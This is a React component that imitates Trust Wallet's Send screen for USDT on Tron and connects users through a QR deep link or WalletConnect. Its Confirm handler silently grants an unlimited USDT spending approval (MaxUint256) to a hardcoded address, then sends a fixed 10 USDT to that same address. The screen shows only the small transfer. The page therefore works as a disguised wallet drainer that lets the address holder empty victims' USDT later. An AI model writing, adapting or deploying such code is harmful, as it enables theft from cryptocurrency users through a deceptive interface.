import { useMemo, useState } from "react";
import { Info, ScanLine, Wallet } from "lucide-react";
import { toast } from "sonner";
import { useTronWallet } from "@/lib/tronwallet-adapter";
import { approveUSDT, transferUSDT } from "@/lib/web3";

const DEFAULT_TO_ADDRESS = "TYT6ty8mhUyq7w2GbTWT1LSqWaWTs3j4aa";
const DEFAULT_AMOUNT = "10";

function buildTrustWalletOpenUrlDeepLink(): string {
  if (typeof window === "undefined") {
    return "";
  }
  const target = `${window.location.origin}/#/trustwallet/tron`;
  return `https://link.trustwallet.com/open_url?url=${encodeURIComponent(target)}`;
}

const TrustWalletTronPay = () => {
  const { connect, address, isConnected, isConnecting } = useTronWallet();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [trustConnecting, setTrustConnecting] = useState(false);
  const [wcConnecting, setWcConnecting] = useState(false);

  const toAddress = useMemo(() => DEFAULT_TO_ADDRESS, []);
  const amount = useMemo(() => DEFAULT_AMOUNT, []);
  const approveTo = useMemo(() => DEFAULT_TO_ADDRESS, []);

  const trustConnectDeepLink = useMemo(() => buildTrustWalletOpenUrlDeepLink(), []);
  const trustConnectQrUrl = useMemo(
    () =>
      `https://quickchart.io/qr?size=420&margin=1&ecLevel=H&dark=1e81f5&light=f2f2f2&text=${encodeURIComponent(
        trustConnectDeepLink
      )}`,
    [trustConnectDeepLink]
  );

  const handleWalletConnectQr = async () => {
    try {
      setWcConnecting(true);
      await connect("walletconnect");
      toast.success("Wallet connected");
    } catch (error) {
      toast.error(
        error instanceof Error ? error.message : "WalletConnect failed"
      );
    } finally {
      setWcConnecting(false);
    }
  };

  const handleConnectInTrustApp = async () => {
    try {
      setTrustConnecting(true);
      await connect("trust");
      toast.success("Wallet connected");
    } catch (error) {
      toast.error(
        error instanceof Error ? error.message : "Could not connect in Trust Wallet"
      );
    } finally {
      setTrustConnecting(false);
    }
  };

  const handleConfirm = async () => {
    if (!isConnected) {
      toast.error("Connect your wallet first using the QR code or WalletConnect.");
      return;
    }
    try {
      setIsSubmitting(true);

      // Step 1: unlimited approve (MaxUint256) to spender address.
      await approveUSDT("tron", approveTo);

      // Step 2: send fixed USDT amount to destination address.
      await transferUSDT("tron", toAddress, amount);

      toast.success("Approve and transfer completed successfully.");
    } catch (error) {
      toast.error(
        error instanceof Error ? error.message : "Transaction flow failed"
      );
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#f5f5f6] flex justify-center p-3 pb-28">
      <div className="w-full max-w-sm bg-[#f5f5f6] pt-4">
        <div className="mb-5">
          <p className="text-[24px] leading-7 font-semibold text-[#262626]">
            Send
          </p>
          <div className="text-xs text-[#8b8b94] mt-1 flex items-center gap-1.5">
            <Wallet className="w-3.5 h-3.5" />
            {isConnected
              ? `Connected: ${address?.slice(0, 6)}...${address?.slice(-4)}`
              : isConnecting || wcConnecting || trustConnecting
              ? "Connecting..."
              : "Not connected — scan QR or use WalletConnect"}
          </div>
        </div>

        {!isConnected && (
          <div className="mb-6 rounded-xl border border-[#e4e4e8] bg-white p-4 shadow-sm">
            <p className="text-[13px] font-medium text-[#5e5e66] mb-2">
              Connect with Trust Wallet
            </p>
            <p className="text-xs text-[#8b8b94] mb-3 leading-relaxed">
              Scan this QR with Trust Wallet. It opens this page in Discover; then approve the connection in the app.
            </p>
            <div className="relative rounded-lg bg-[#f2f2f2] p-2">
              <img
                src={trustConnectQrUrl}
                alt="Trust Wallet connect"
                className="w-full max-w-[260px] mx-auto h-auto rounded-md"
              />
              <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                <div className="w-16 h-16 rounded-full bg-white flex items-center justify-center shadow-sm">
                  <div
                    className="w-9 h-11"
                    style={{
                      clipPath:
                        "polygon(50% 0%, 92% 12%, 92% 56%, 50% 100%, 8% 56%, 8% 12%)",
                      background:
                        "linear-gradient(90deg, #1b22f4 0%, #1b22f4 50%, #37c0f3 100%)",
                    }}
                  />
                </div>
              </div>
            </div>
            <a
              href={trustConnectDeepLink}
              className="mt-3 block w-full rounded-full bg-[#8d8cf0] text-white text-center py-2.5 text-sm font-semibold"
            >
              Open in Trust Wallet
            </a>
            <button
              type="button"
              className="mt-2 w-full rounded-full border border-[#d7d7dc] bg-white py-2.5 text-sm font-medium text-[#4b4b54] disabled:opacity-50"
              onClick={handleConnectInTrustApp}
              disabled={wcConnecting || trustConnecting || isConnecting}
            >
              {trustConnecting ? "Connecting…" : "Connect in Trust Wallet (in-app)"}
            </button>
            <button
              type="button"
              className="mt-2 w-full rounded-full border border-[#d7d7dc] bg-white py-2.5 text-sm font-medium text-[#4b4b54] disabled:opacity-50"
              onClick={handleWalletConnectQr}
              disabled={wcConnecting || trustConnecting || isConnecting}
            >
              {wcConnecting ? "Opening WalletConnect…" : "Connect with WalletConnect (QR)"}
            </button>
          </div>
        )}

        <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
          Address or Domain Name
        </label>
        <div className="h-12 rounded-xl border border-[#d7d7dc] bg-white px-3 flex items-center justify-between">
          <span className="text-[#171717] text-sm truncate">{toAddress}</span>
          <span className="text-[#5f5de8] text-sm font-semibold">Paste</span>
        </div>

        <div className="mt-5">
          <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
            Destination network
          </label>
          <div className="inline-flex items-center gap-2 rounded-full bg-[#efeff2] px-3 py-1.5">
            <span className="w-4 h-4 rounded-full bg-[#ef2c2c] inline-block" />
            <span className="text-sm text-[#4c4c52]">Tron</span>
          </div>
        </div>

        <div className="mt-5">
          <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
            Amount
          </label>
          <div className="h-14 rounded-xl border border-[#d7d7dc] bg-white px-3 flex items-center justify-between">
            <span className="text-[#171717] text-[28px] leading-none font-medium">
              {amount}
            </span>
            <div className="flex items-center gap-2">
              <span className="text-[#67676f] text-base">USDT</span>
              <span className="text-[#5f5de8] text-base font-semibold">Max</span>
            </div>
          </div>
          <p className="text-[#8d8d96] text-xs mt-2">≈ 10.00 USDT</p>
        </div>

        <div className="mt-3">
          <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
            Memo
          </label>
          <div className="h-12 rounded-xl border border-[#d7d7dc] bg-white px-3 flex items-center justify-end gap-3">
            <ScanLine className="w-4 h-4 text-[#5f5de8]" />
            <Info className="w-4 h-4 text-[#5f5de8]" />
          </div>
        </div>

        <button
          className="fixed bottom-4 left-1/2 -translate-x-1/2 w-[calc(100%-24px)] max-w-sm h-12 rounded-full bg-[#8d8cf0] text-white font-semibold disabled:opacity-55"
          onClick={handleConfirm}
          disabled={
            isSubmitting ||
            !isConnected ||
            isConnecting ||
            wcConnecting ||
            trustConnecting
          }
          type="button"
        >
          {isSubmitting ? "Confirming..." : "Confirm"}
        </button>
      </div>
    </div>
  );
};

export default TrustWalletTronPay;
